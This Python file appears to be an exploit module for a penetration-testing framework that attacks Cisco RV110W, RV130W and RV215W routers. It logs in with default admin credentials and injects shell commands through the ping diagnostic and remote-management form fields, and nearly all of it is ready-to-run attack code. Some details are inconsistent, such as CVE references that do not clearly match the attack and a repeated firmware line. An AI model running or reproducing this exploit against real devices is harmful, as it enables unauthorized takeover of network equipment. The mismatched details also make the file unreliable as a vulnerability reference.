#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Cisco RV Series Routers Remote Code Execution
CVE-2019-1653, CVE-2020-3331
"""

import requests
import urllib.parse

MODULE_INFO = {
    "name": "Cisco RV Series RCE",
    "description": "Remote Code Execution in Cisco RV110W, RV130W, RV215W routers via management interface",
    "author": "Lazy Framework Team",
    "license": "MIT",
    "platform": "linux",
    "rank": "Great",
    "references": [
        "CVE-2019-1653",
        "CVE-2020-3331",
        "https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190123-rv-routers-rce"
    ],
    "dependencies": ["requests"]
}

OPTIONS = {
    "RHOST": {
        "description": "Target router IP address",
        "required": True,
        "default": "192.168.1.1"
    },
    "RPORT": {
        "description": "Target router port",
        "required": False,
        "default": "80"
    },
    "USERNAME": {
        "description": "Username for authentication",
        "required": False,
        "default": "admin"
    },
    "PASSWORD": {
        "description": "Password for authentication",
        "required": False,
        "default": "admin"
    },
    "CMD": {
        "description": "Command to execute",
        "required": True,
        "default": "id"
    },
    "MODEL": {
        "description": "Router model (rv110w, rv130w, rv215w, auto)",
        "required": False,
        "default": "auto"
    }
}

class CiscoRVRCE:
    def __init__(self, target, port=80, username="admin", password="admin"):
        self.target = target
        self.port = port
        self.username = username
        self.password = password
        self.base_url = f"http://{target}:{port}"
        self.session = requests.Session()
        self.session.verify = False
        
    def login(self):
        """Login to Cisco router"""
        try:
            login_data = {
                "username": self.username,
                "password": self.password,
                "submit": "Log In"
            }
            
            login_url = f"{self.base_url}/login.cgi"
            response = self.session.post(login_url, data=login_data, timeout=10)
            
            return "logout" in response.text or response.status_code == 200
            
        except Exception as e:
            return False
    
    def execute_command_rv110w(self, command):
        """RCE for RV110W via diagnostic interface"""
        try:
            # Command injection in diagnostic page
            payload = f"127.0.0.1; {command} #"
            
            exploit_data = {
                "ping_ip": payload,
                "ping_size": "64",
                "ping_times": "5",
                "submit": "Ping"
            }
            
            exploit_url = f"{self.base_url}/diagnostic.html"
            response = self.session.post(exploit_url, data=exploit_data, timeout=10)
            return response.text
            
        except Exception as e:
            return f"Error: {str(e)}"
    
    def execute_command_rv130w(self, command):
        """RCE for RV130W via different endpoint"""
        try:
            # Different endpoint for RV130W
            payload = f"';{command};echo '"
            
            exploit_data = {
                "remote_mgt_enable": "1",
                "remote_mgt_ip": payload,
                "remote_mgt_port": "80",
                "submit": "Save"
            }
            
            exploit_url = f"{self.base_url}/remote_management.html"
            response = self.session.post(exploit_url, data=exploit_data, timeout=10)
            return response.text
            
        except Exception as e:
            return f"Error: {str(e)}"

def display_exploit_info():
    """Display exploit information"""
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    
    console = Console()
    
    table = Table(show_header=True, header_style="bold red", box=None)
    table.add_column("Module", style="bold yellow")
    table.add_column("Details", style="white")
    
    table.add_row("Name", MODULE_INFO["name"])
    table.add_row("Module", "exploit/linux/router/cisco_rv_rce")
    table.add_row("Disclosure", "2019-2020")
    table.add_row("Platform", MODULE_INFO["platform"])
    table.add_row("Arch", "arm,mips")
    table.add_row("Rank", MODULE_INFO["rank"])
    
    console.print(Panel(table, title="Exploit Information", border_style="red"))
    
    # Affected devices
    affected_panel = Panel(
        "Cisco RV110W Firmware <= 1.2.2.5\n"
        "Cisco RV130W Firmware <= 1.0.3.55\n" 
        "Cisco RV130W Firmware <= 1.0.3.55\n"
        "Cisco RV215W Firmware <= 1.3.1.7",
        title="Affected Devices/Firmware",
        border_style="yellow"
    )
    console.print(affected_panel)

def run(session, options):
    """Main exploit function"""
    from rich.console import Console
    from rich.panel import Panel
    from rich.syntax import Syntax
    from rich.table import Table
    
    console = Console()
    
    # Display exploit info
    display_exploit_info()
    
    # Display options
    current_options = OPTIONS.copy()
    for key in current_options:
        if key in options:
            current_options[key]['value'] = options[key]
    
    table = Table(show_header=True, header_style="bold magenta", box=None)
    table.add_column("Name", style="bold cyan")
    table.add_column("Current Setting", style="green")
    table.add_column("Required", style="yellow")
    table.add_column("Description", style="white")
    
    for name, config in current_options.items():
        current = config.get('value', config.get('default', ''))
        required = "yes" if config.get('required', False) else "no"
        description = config.get('description', '')
        
        table.add_row(name, str(current), required, description)
    
    console.print(Panel(table, title="Module Options (exploit/linux/router/cisco_rv_rce)", border_style="blue"))
    
    # Get options
    rhost = options.get("RHOST", "192.168.1.1")
    rport = options.get("RPORT", "80")
    username = options.get("USERNAME", "admin")
    password = options.get("PASSWORD", "admin")
    cmd = options.get("CMD", "id")
    model = options.get("MODEL", "auto")
    
    console.print(f"\n[bold yellow][*][/bold yellow] Target: [cyan]{rhost}:{rport}[/cyan]")
    console.print(f"[bold yellow][*][/bold yellow] Credentials: [cyan]{username}:{password}[/cyan]")
    console.print(f"[bold yellow][*][/bold yellow] Command: [red]{cmd}[/red]")
    
    try:
        # Initialize exploit
        exploit = CiscoRVRCE(rhost, rport, username, password)
        
        console.print("\n[bold yellow][*][/bold yellow] Attempting to login...")
        if exploit.login():
            console.print("[bold green][+][/bold green] Login successful!")
            
            console.print("[bold yellow][*][/bold yellow] Executing command via RCE...")
            
            # Try different methods based on model
            if model in ["auto", "rv110w"]:
                result = exploit.execute_command_rv110w(cmd)
            elif model == "rv130w":
                result = exploit.execute_command_rv130w(cmd)
            else:
                # Try both methods
                result = exploit.execute_command_rv110w(cmd)
                if "Error" in result:
                    result = exploit.execute_command_rv130w(cmd)
            
            if result and "Error" not in result:
                console.print("[bold green][+][/bold green] Command executed successfully!")
                
                # Display result
                syntax = Syntax(result, "text", theme="monokai", line_numbers=True)
                console.print(Panel(syntax, title="Command Output", border_style="green"))
                
            else:
                console.print("[red][-][/red] Command execution failed")
                if result:
                    console.print(f"[red]Error: {result}[/red]")
                    
        else:
            console.print("[red][-][/red] Login failed! Check credentials")
            
    except Exception as e:
        console.print(f"[red][-][/red] Exploit failed: {str(e)}")
